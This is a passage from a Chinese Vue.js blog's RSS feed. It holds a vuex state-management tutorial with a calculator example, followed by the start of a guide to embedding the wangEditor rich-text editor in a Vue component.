      <span>font-weight</span><span>:</span> bold<span>;</span>
    <span>}</span>

    <span>&amp;-input</span> <span>{</span>
      <span>display</span><span>:</span> flex<span>;</span>
    <span>}</span>
    <span>&amp;-btn</span> <span>{</span>
      <span>background-color</span><span>:</span> #ff33ae <span>!important</span><span>;</span>
      <span>color</span><span>:</span> #fff <span>!important</span><span>;</span>
      <span>margin-left</span><span>:</span> 30px<span>;</span>
    <span>}</span>
  <span>}</span>
  <span>&amp;-edit-input</span> <span>{</span>
    <span>display</span><span>:</span> flex<span>;</span>
    <span>align-items</span><span>:</span> center<span>;</span>
    <span>width</span><span>:</span> 100%<span>;</span>
    <span>&amp;-label</span> <span>{</span>
      <span>display</span><span>:</span> inline-block<span>;</span>
      <span>width</span><span>:</span> 60px<span>;</span>
    <span>}</span>
  <span>}</span>

  <span>&amp;-list</span> <span>{</span>
    <span>margin-top</span><span>:</span> 40px<span>;</span>
    <span>min-height</span><span>:</span> 500px<span>;</span>
    <span>&amp;-center</span> <span>{</span>
      <span>display</span><span>:</span> flex<span>;</span>
      <span>align-items</span><span>:</span> center<span>;</span>
      <span>justify-content</span><span>:</span> center<span>;</span>
    <span>}</span>

    <span>&amp;-item</span> <span>{</span>
      <span>border</span><span>:</span> 1px solid #dedede<span>;</span>
      <span>padding</span><span>:</span> 20px<span>;</span>
      <span>display</span><span>:</span> flex<span>;</span>
      <span>justify-content</span><span>:</span> space-between<span>;</span>
      <span>align-items</span><span>:</span> center<span>;</span>
      <span>width</span><span>:</span> 100%<span>;</span>
      <span>span</span> <span>{</span>
        <span>font-size</span><span>:</span> 16px<span>;</span>
      <span>}</span>
      <span>&amp;:first-child</span> <span>{</span>
        <span>border-top-left-radius</span><span>:</span> 4px<span>;</span>
        <span>border-top-right-radius</span><span>:</span> 4px<span>;</span>
      <span>}</span>
      <span>&amp;:last-child</span> <span>{</span>
        <span>border-bottom-left-radius</span><span>:</span> 4px<span>;</span>
        <span>border-bottom-right-radius</span><span>:</span> 4px<span>;</span>
      <span>}</span>
      <span>&amp;--edit</span> <span>{</span>
        <span>margin-right</span><span>:</span> 15px<span>;</span>
      <span>}</span>
      <span>&amp;--edit,
      &amp;--del</span> <span>{</span>
        <span>cursor</span><span>:</span> pointer<span>;</span>
        <span>width</span><span>:</span> 16px<span>;</span>
        <span>height</span><span>:</span> 16px<span>;</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>在 vue.js 项目中使用 vuex</title>
      <link>https://vxhly.github.io/views/vuejs/usage-vuex-on-vue-js-project.html</link>
      <guid>https://vxhly.github.io/views/vuejs/usage-vuex-on-vue-js-project.html</guid>
      <source url="https://vxhly.github.io/rss.xml">在 vue.js 项目中使用 vuex</source>
      <description>前言
Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。 它采用集中式存储管理应用的所有组件的状态, 并以相应的规则保证状态以一种可预测的方式发生变化。 这里就简单的介绍 vuex 的使用方法。

</description>
      <category>vuejs</category>
      <pubDate>Sat, 26 Jan 2019 12:18:11 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。 它采用集中式存储管理应用的所有组件的状态, 并以相应的规则保证状态以一种可预测的方式发生变化。 这里就简单的介绍 vuex 的使用方法。</p>
</div>

<h2 id="文档" tabindex="-1"> 文档</h2>
<p><a href="https://vuex.vuejs.org/zh-cn/" target="_blank" rel="noopener noreferrer">vuex 官方文档</a></p>
<h2 id="关于-vuex-的严格模式" tabindex="-1"> 关于 vuex 的严格模式</h2>
<p>在 vuex 有个参数是 <code>strict</code> 这个是可以配置 vuex 开启严格模式, 这里极力推荐开启严格模式, 当然是在开发模式下, 线上模式可以进行关闭, 因为我们不希望内部逻辑暴露在外面。</p>
<p>至于为什么极力推荐开启 vuex 的严格模式, 有以下这些原因:</p>
<ul>
<li>官方也是这么推荐的, vuex 中的数据被称作 state, 这些数据通过 getters 将其暴露给组件使用, 那么要想改变其值只能在 vuex 内部实现（即 modules 和 actiions, 具体可以阅读官方文档）</li>
<li>vuex 被设计出来就是一个第三方的状态管理仓库, 当然这些状态也只能由内部的逻辑实现, 外部也可以对 state 的值进行改变, 但是不推荐</li>
<li>我们常说的 cookie 也好 session 也好, 它们有个致命的弱点, 就是比较容易被窃取, 那么 vuex 就规避了这些缺点, 因为所有的数据都在 vuex 的 store 仓库, 只能由 vuex 内部的状态来管理, 就不容易被窃取, 如果由外部的逻辑来改变 state 值, 那么 vuex 的安全性岌岌可危</li>
</ul>
<p>更多详情请阅读 <a href="https://vuex.vuejs.org/zh/guide/strict.html" target="_blank" rel="noopener noreferrer">vuex 严格模式</a></p>
<h2 id="关于-vuex" tabindex="-1"> 关于 vuex</h2>
<ul>
<li><code>state</code> =&gt; 单一状态树, 数据存储库, 即驱动应用的数据源</li>
<li><code>getter</code> =&gt; 派生出 <code>state</code> 的值</li>
<li><code>mutation</code> =&gt; 更改状态的唯一途径, 直接修改状态</li>
<li><code>action</code> =&gt; 提交 <code>mutation</code> , 不是直接修改状态, 相应在 <code>view</code> 上的用户输入导致状态的变化</li>
<li><code>module</code> =&gt; 整合一个模块的 <code>state</code> 、 <code>getter</code> 、 <code>mutation</code> 、 <code>action</code></li>
<li><code>view</code> =&gt; 以声明方式将 <code>state</code> 映射到视图</li>
</ul>
<h2 id="install" tabindex="-1"> install</h2>
<p>使用命令安装 vuex 依赖</p>
<div><pre><code><span>npm</span> i -D vuex
<span># or</span>
<span>yarn</span> <span>add</span> vuex
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="目录结构" tabindex="-1"> 目录结构</h3>
<p>我们单独创建一个 <code>store</code> 目录, 目录结构大致是</p>
<div><pre><code><span>|</span>-- src
  <span>|</span>-- store
    <span>|</span>-- modules
      <span>|</span>-- index.js
      <span>|</span>-- <span>..</span>. <span>..</span>.
    <span>|</span>-- getters.js      <span># 根级别的 mutation =></span>
    <span>|</span>-- index.js        <span># 我们组装模块并导出 store 的地方</span>
    <span>|</span>-- mutation-types.js        <span># 根级别的 type => 状态</span>
  <span>|</span>-- main.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="导入-vuex" tabindex="-1"> 导入 vuex</h3>
<p><code>src/mian.js</code></p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> store <span>from</span> <span>"@/store"</span><span>;</span>
Vue<span>.</span>config<span>.</span>productionTip <span>=</span> <span>false</span><span>;</span>
<span>new</span> <span>Vue</span><span>(</span><span>{</span>
  store<span>,</span>
  <span>render</span><span>:</span> <span>(</span><span>h</span><span>)</span> <span>=></span> <span>h</span><span>(</span>App<span>)</span><span>,</span>
<span>}</span><span>)</span><span>.</span><span>$mount</span><span>(</span><span>"#app"</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>strore/index.js</code></p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> Vuex <span>from</span> <span>"vuex"</span><span>;</span>
<span>import</span> modules <span>from</span> <span>"./modules"</span><span>;</span>
<span>import</span> getters <span>from</span> <span>"./getters"</span><span>;</span>
Vue<span>.</span><span>use</span><span>(</span>Vuex<span>)</span><span>;</span>
<span>const</span> debug <span>=</span> <span>true</span><span>;</span> <span>// 推荐开启严格模式</span>
<span>export</span> <span>default</span> <span>new</span> <span>Vuex<span>.</span>Store</span><span>(</span><span>{</span>
  modules<span>,</span>
  getters<span>,</span>
  <span>strict</span><span>:</span> debug<span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>strore/getters.js</code></p>
<div><pre><code><span>const</span> getters <span>=</span> <span>{</span>
    <span>[</span>stateName<span>]</span><span>:</span> <span>state</span> <span>=></span> state<span>.</span> <span>[</span>modulesName<span>]</span><span>.</span> <span>[</span>stateName<span>]</span>
<span>}</span>
<span>export</span> <span>default</span> getters
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p><code>store/modules/index.js</code></p>
<div><pre><code><span>const</span> files <span>=</span> require<span>.</span><span>context</span><span>(</span><span>"."</span><span>,</span> <span>false</span><span>,</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>)</span><span>;</span>
<span>const</span> modules <span>=</span> <span>{</span><span>}</span><span>;</span>
files<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>key <span>===</span> <span>"./index.js"</span><span>)</span> <span>return</span><span>;</span>
  modules<span>[</span>key<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(\.\/|\.js)</span><span>/</span><span>g</span></span><span>,</span> <span>""</span><span>)</span><span>]</span> <span>=</span> <span>files</span><span>(</span>key<span>)</span><span>.</span>default<span>;</span>
<span>}</span><span>)</span><span>;</span>
<span>export</span> <span>default</span> modules<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>store/mutation-types.js</code></p>
<div><pre><code><span>// 这边必须使用全大写, 没有为什么</span>
<span>export</span> <span>const</span> <span>TYPES_NAME</span> <span>=</span> <span>"TYPES_NAME"</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="vuex-食用例子" tabindex="-1"> vuex 食用例子</h3>
<p>做完以上的工作之后我们就可以进行使用 vuex 了, 下方举一个最简单的两个数的 加减乘除 的例子</p>
<p>在线访问 <a href="https://codesandbox.io/s/6j1kojkr9w" target="_blank" rel="noopener noreferrer">Edit on CodeSandbox</a></p>
<p><code>store/mutation-types.js</code></p>
<div><pre><code><span>export</span> <span>const</span> <span>ADDITION</span> <span>=</span> <span>"ADDITION"</span><span>;</span> <span>// + 加法</span>
<span>export</span> <span>const</span> <span>SUBSTRUCTION</span> <span>=</span> <span>"SUBSTRUCTION"</span><span>;</span> <span>// - 减法</span>
<span>export</span> <span>const</span> <span>MULTIPLICATION</span> <span>=</span> <span>"MULTIPLICATION"</span><span>;</span> <span>// * 乘法</span>
<span>export</span> <span>const</span> <span>DIVISION</span> <span>=</span> <span>"DIVISION"</span><span>;</span> <span>// / 除法</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p><code>store/modules/operation.js</code></p>
<div><pre><code><span>import</span> <span>{</span>
  <span>ADDITION</span><span>,</span>
  <span>SUBSTRUCTION</span><span>,</span>
  <span>MULTIPLICATION</span><span>,</span>
  <span>DIVISION</span><span>,</span>
<span>}</span> <span>from</span> <span>"@/store/mutation-types"</span><span>;</span>
<span>const</span> operation <span>=</span> <span>{</span>
  <span>state</span><span>:</span> <span>{</span>
    <span>result</span><span>:</span> <span>0</span><span>,</span>
  <span>}</span><span>,</span>
  <span>mutations</span><span>:</span> <span>{</span>
    <span>[</span><span>ADDITION</span><span>]</span><span>:</span> <span>(</span><span>state<span>,</span> payload</span><span>)</span> <span>=></span> <span>{</span>
      state<span>.</span>result <span>=</span> <span>Number</span><span>(</span>payload<span>.</span>a<span>)</span> <span>+</span> <span>Number</span><span>(</span>payload<span>.</span>b<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>[</span><span>SUBSTRUCTION</span><span>]</span><span>:</span> <span>(</span><span>state<span>,</span> payload</span><span>)</span> <span>=></span> <span>{</span>
      state<span>.</span>result <span>=</span> <span>Number</span><span>(</span>payload<span>.</span>a<span>)</span> <span>-</span> <span>Number</span><span>(</span>payload<span>.</span>b<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>[</span><span>MULTIPLICATION</span><span>]</span><span>:</span> <span>(</span><span>state<span>,</span> payload</span><span>)</span> <span>=></span> <span>{</span>
      state<span>.</span>result <span>=</span> <span>Number</span><span>(</span>payload<span>.</span>a<span>)</span> <span>*</span> <span>Number</span><span>(</span>payload<span>.</span>b<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>[</span><span>DIVISION</span><span>]</span><span>:</span> <span>(</span><span>state<span>,</span> payload</span><span>)</span> <span>=></span> <span>{</span>
      state<span>.</span>result <span>=</span> <span>Number</span><span>(</span>payload<span>.</span>a<span>)</span> <span>/</span> <span>Number</span><span>(</span>payload<span>.</span>b<span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>actions</span><span>:</span> <span>{</span>
    <span>addition</span><span>(</span><span><span>{</span> commit <span>}</span><span>,</span> payload</span><span>)</span> <span>{</span>
      <span>commit</span><span>(</span><span>ADDITION</span><span>,</span> payload<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>substrction</span><span>(</span><span><span>{</span> commit <span>}</span><span>,</span> payload</span><span>)</span> <span>{</span>
      <span>commit</span><span>(</span><span>SUBSTRUCTION</span><span>,</span> payload<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>multiplication</span><span>(</span><span><span>{</span> commit <span>}</span><span>,</span> payload</span><span>)</span> <span>{</span>
      <span>commit</span><span>(</span><span>MULTIPLICATION</span><span>,</span> payload<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>division</span><span>(</span><span><span>{</span> commit <span>}</span><span>,</span> payload</span><span>)</span> <span>{</span>
      <span>commit</span><span>(</span><span>DIVISION</span><span>,</span> payload<span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
<span>export</span> <span>default</span> operation<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>store/getters.js</code></p>
<div><pre><code><span>const</span> getters <span>=</span> <span>{</span>
  <span>result</span><span>:</span> <span>(</span><span>state</span><span>)</span> <span>=></span> state<span>.</span>operation<span>.</span>result<span>,</span>
<span>}</span><span>;</span>
<span>export</span> <span>default</span> getters<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p><code>views/Operation.vue</code></p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>
      <span><span><span>&lt;</span>input</span>
        <span>type</span><span><span>=</span><span>"</span>number<span>"</span></span>
        <span>v-model</span><span><span>=</span><span>"</span>payload.a<span>"</span></span>
        <span>placeholder</span><span><span>=</span><span>"</span>参数 A<span>"</span></span>
        <span><span>style</span><span><span>=</span><span>"</span><span><span>margin</span><span>:</span>0 5px<span>;</span><span>height</span><span>:</span>18px<span>;</span><span>width</span><span>:</span>50px<span>;</span></span><span>"</span></span></span>
      <span>/></span></span>
      {{ operation }}
      <span><span><span>&lt;</span>input</span>
        <span>type</span><span><span>=</span><span>"</span>number<span>"</span></span>
        <span>v-model</span><span><span>=</span><span>"</span>payload.b<span>"</span></span>
        <span>placeholder</span><span><span>=</span><span>"</span>参数 B<span>"</span></span>
        <span><span>style</span><span><span>=</span><span>"</span><span><span>margin</span><span>:</span>0 5px<span>;</span><span>height</span><span>:</span>18px<span>;</span><span>width</span><span>:</span>50px<span>;</span></span><span>"</span></span></span>
      <span>/></span></span>
      = {{ result }}
    <span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span><span>style</span><span><span>=</span><span>"</span><span><span>margin-top</span><span>:</span>10px</span><span>"</span></span></span><span>></span></span>
      <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>addition<span>"</span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>margin</span><span>:</span>0 5px<span>;</span></span><span>"</span></span></span><span>></span></span>+<span><span><span>&lt;/</span>button</span><span>></span></span>
      <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>substrction<span>"</span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>margin</span><span>:</span>0 5px<span>;</span></span><span>"</span></span></span><span>></span></span>-<span><span><span>&lt;/</span>button</span><span>></span></span>
      <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>multiplication<span>"</span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>margin</span><span>:</span>0 5px<span>;</span></span><span>"</span></span></span><span>></span></span>*<span><span><span>&lt;/</span>button</span><span>></span></span>
      <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>division<span>"</span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>margin</span><span>:</span>0 5px<span>;</span></span><span>"</span></span></span><span>></span></span>/<span><span><span>&lt;/</span>button</span><span>></span></span>
    <span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>import</span> <span>{</span> mapGetters <span>}</span> <span>from</span> <span>"vuex"</span><span>;</span>

  <span>export</span> <span>default</span> <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>operation</span><span>:</span> <span>"+"</span><span>,</span>
        <span>payload</span><span>:</span> <span>{</span>
          <span>a</span><span>:</span> <span>0</span><span>,</span>
          <span>b</span><span>:</span> <span>0</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>computed</span><span>:</span> <span>{</span>
      <span>...</span><span>mapGetters</span><span>(</span><span>[</span><span>"result"</span><span>]</span><span>)</span><span>,</span>
    <span>}</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
      <span>addition</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>operation <span>=</span> <span>"+"</span><span>;</span>
        <span>this</span><span>.</span>$store<span>.</span><span>dispatch</span><span>(</span><span>"addition"</span><span>,</span> <span>this</span><span>.</span>payload<span>)</span><span>;</span>
      <span>}</span><span>,</span>
      <span>substrction</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>operation <span>=</span> <span>"-"</span><span>;</span>
        <span>this</span><span>.</span>$store<span>.</span><span>dispatch</span><span>(</span><span>"substrction"</span><span>,</span> <span>this</span><span>.</span>payload<span>)</span><span>;</span>
      <span>}</span><span>,</span>
      <span>multiplication</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>operation <span>=</span> <span>"*"</span><span>;</span>
        <span>this</span><span>.</span>$store<span>.</span><span>dispatch</span><span>(</span><span>"multiplication"</span><span>,</span> <span>this</span><span>.</span>payload<span>)</span><span>;</span>
      <span>}</span><span>,</span>
      <span>division</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>operation <span>=</span> <span>"/"</span><span>;</span>
        <span>this</span><span>.</span>$store<span>.</span><span>dispatch</span><span>(</span><span>"division"</span><span>,</span> <span>this</span><span>.</span>payload<span>)</span><span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>在 vue.js 中使用 wangEditor 富文本编辑器</title>
      <link>https://vxhly.github.io/views/vuejs/usage-wangEditor-in-vue-js.html</link>
      <guid>https://vxhly.github.io/views/vuejs/usage-wangEditor-in-vue-js.html</guid>
      <source url="https://vxhly.github.io/rss.xml">在 vue.js 中使用 wangEditor 富文本编辑器</source>
      <description>前言
富文本编辑器在后台管理系统中是一个常见而又简单的需求, 这里介绍到的是在 vue.js 项目中使用 wangEditor 这一款富文本编辑器。

</description>
      <category>vuejs</category>
      <pubDate>Wed, 13 Jun 2018 08:37:16 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>富文本编辑器在后台管理系统中是一个常见而又简单的需求, 这里介绍到的是在 vue.js 项目中使用 wangEditor 这一款富文本编辑器。</p>
</div>

<h2 id="wangeditor" tabindex="-1"> wangEditor</h2>
<p>至于这款编辑器并不想做过多的介绍, 自行查阅官方文档</p>
<div><p>相关链接</p>
<p>官网: <a href="http://www.wangeditor.com/" target="_blank" rel="noopener noreferrer">www.wangEditor.com</a> 文档: <a href="http://www.kancloud.cn/wangfupeng/wangeditor3/332599" target="_blank" rel="noopener noreferrer">www.kancloud.cn/wangfupeng/wangeditor3/332599</a></p>
</div>
<h2 id="结合-vue-js-项目" tabindex="-1"> 结合 Vue.js 项目</h2>
<h3 id="建立-vue-js-项目" tabindex="-1"> 建立 Vue.js 项目</h3>
<p>首先该项目是基于 webpack 的一个项目, 如果已经是了请忽略</p>
<div><pre><code>vue init webpack demo
<span>cd</span> demo
<span>npm</span> i
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="安装-wangeditor-依赖" tabindex="-1"> 安装 wangEditor 依赖</h3>
<div><pre><code><span>npm</span> <span>install</span> wangeditor
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="编写组件代码" tabindex="-1"> 编写组件代码</h3>
<p>在组件目录下新建 <code>EditorBar.vue</code> , 然后就可以编写代码了</p>
<p>这边使用菜单与编辑器区域分离作为 demo, 这边也列出了在 vue 中常见几种 API 调用方法</p>
<div><pre><code><span><span><span>&lt;</span>template</span> <span>lang</span><span><span>=</span><span>"</span>html<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>editor<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>ref</span><span><span>=</span><span>"</span>toolbar<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>toolbar<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>ref</span><span><span>=</span><span>"</span>editor<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>text<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>import</span> <span>E</span> <span>from</span> <span>"wangeditor"</span><span>;</span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>name</span><span>:</span> <span>"Editorbar"</span><span>,</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>editor</span><span>:</span> <span>null</span><span>,</span>
        <span>info_</span><span>:</span> <span>null</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>model</span><span>:</span> <span>{</span>
      <span>prop</span><span>:</span> <span>"value"</span><span>,</span>
      <span>event</span><span>:</span> <span>"change"</span><span>,</span>
    <span>}</span><span>,</span>
    <span>props</span><span>:</span> <span>{</span>
      <span>value</span><span>:</span> <span>{</span>
        <span>type</span><span>:</span> String<span>,</span>
        <span>default</span><span>:</span> <span>""</span><span>,</span>
      <span>}</span><span>,</span>
      <span>isClear</span><span>:</span> <span>{</span>
        <span>type</span><span>:</span> Boolean<span>,</span>
        <span>default</span><span>:</span> <span>false</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    <span>watch</span><span>:</span> <span>{</span>
      <span>isClear</span><span>(</span><span>val</span><span>)</span> <span>{</span>
        <span>// 触发清除文本域内容</span>
        <span>if</span> <span>(</span>val<span>)</span> <span>{</span>
          <span>this</span><span>.</span>editor<span>.</span>txt<span>.</span><span>clear</span><span>(</span><span>)</span><span>;</span>
          <span>this</span><span>.</span>info_ <span>=</span> <span>null</span><span>;</span>
        <span>}</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    <span>mounted</span><span>(</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>seteditor</span><span>(</span><span>)</span><span>;</span>
      <span>this</span><span>.</span>editor<span>.</span>txt<span>.</span><span>html</span><span>(</span><span>this</span><span>.</span>value<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
      <span>seteditor</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>editor <span>=</span> <span>new</span> <span>E</span><span>(</span><span>this</span><span>.</span>$refs<span>.</span>toolbar<span>,</span> <span>this</span><span>.</span>$refs<span>.</span>editor<span>)</span><span>;</span>

        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadImgShowBase64 <span>=</span> <span>true</span><span>;</span> <span>// base 64 存储图片</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadImgServer <span>=</span> <span>""</span><span>;</span> <span>// 配置服务器端地址</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadImgHeaders <span>=</span> <span>{</span><span>}</span><span>;</span> <span>// 自定义 header</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadFileName <span>=</span> <span>""</span><span>;</span> <span>// 后端接受上传文件的参数名</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadImgMaxSize <span>=</span> <span>2</span> <span>*</span> <span>1024</span> <span>*</span> <span>1024</span><span>;</span> <span>// 将图片大小限制为 2M</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadImgMaxLength <span>=</span> <span>6</span><span>;</span> <span>// 限制一次最多上传 3 张图片</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadImgTimeout <span>=</span> <span>3</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span><span>;</span> <span>// 设置超时时间</span>

        <span>// 配置菜单</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>menus <span>=</span> <span>[</span>
          <span>"head"</span><span>,</span> <span>// 标题</span>
          <span>"bold"</span><span>,</span> <span>// 粗体</span>
          <span>"fontSize"</span><span>,</span> <span>// 字号</span>
          <span>"fontName"</span><span>,</span> <span>// 字体</span>
          <span>"italic"</span><span>,</span> <span>// 斜体</span>
          <span>"underline"</span><span>,</span> <span>// 下划线</span>
          <span>"strikeThrough"</span><span>,</span> <span>// 删除线</span>
          <span>"foreColor"</span><span>,</span> <span>// 文字颜色</span>
          <span>"backColor"</span><span>,</span> <span>// 背景颜色</span>
          <span>"link"</span><span>,</span> <span>// 插入链接</span>
          <span>"list"</span><span>,</span> <span>// 列表</span>
          <span>"justify"</span><span>,</span> <span>// 对齐方式</span>
          <span>"quote"</span><span>,</span> <span>// 引用</span>
          <span>"emoticon"</span><span>,</span> <span>// 表情</span>
          <span>"image"</span><span>,</span> <span>// 插入图片</span>
          <span>"table"</span><span>,</span> <span>// 表格</span>
          <span>"video"</span><span>,</span> <span>// 插入视频</span>
          <span>"code"</span><span>,</span> <span>// 插入代码</span>
          <span>"undo"</span><span>,</span> <span>// 撤销</span>
